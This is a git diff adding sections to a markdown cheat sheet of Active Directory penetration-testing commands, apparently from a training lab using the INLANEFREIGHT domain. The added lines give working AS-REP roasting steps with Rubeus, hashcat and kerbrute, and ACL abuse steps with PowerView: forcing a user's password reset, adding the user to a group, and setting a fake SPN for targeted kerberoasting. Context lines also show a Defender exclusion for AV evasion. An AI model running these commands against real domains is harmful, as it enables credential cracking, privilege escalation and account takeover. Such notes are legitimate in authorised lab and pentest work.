@@ -10,7 +10,8 @@ Enumeration, exploitation, and privilege escalation notes, all in one place.
   - [DCSync Attack](#dcsync-attack)
   - [Kerberoasting](#kerberoasting)
   - [Antivirus Evasion and Detection](#antivirus-evasion-and-detection)
- 
+  - [ASERPRoasting](#aseproasting)
+  - [ACL Enumeration](#acl-enumeration)
  ----
  
 # Enumeration
@@ -153,4 +154,42 @@ Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 
 # PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+## ASERPRoasting
+```bash
+# PowerView based tool used to search for the DONT_REQ_PREAUTH value across in user accounts in a target Windows domain. Performed from a Windows-based host.
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+# Uses Rubeus to perform an ASEP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.
+.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+
+# Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.
+hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
+
+# Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+```
+## ACL Enumeration
+```bash
+# PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
+Find-InterestingDomainAcl
+
+# Used to import PowerView and retrieve the SID of aspecific user account (wley) from a Windows-based host.
+Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley
+
+# Used to create a PSCredential Object from a Windows-based host.
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+
+# PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+# PowerView tool used to add a specifc user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+# PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+# PowerView tool used create a fake Service Principal Name given a sepecift user (adunn) from a Windows-based host.
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 ```
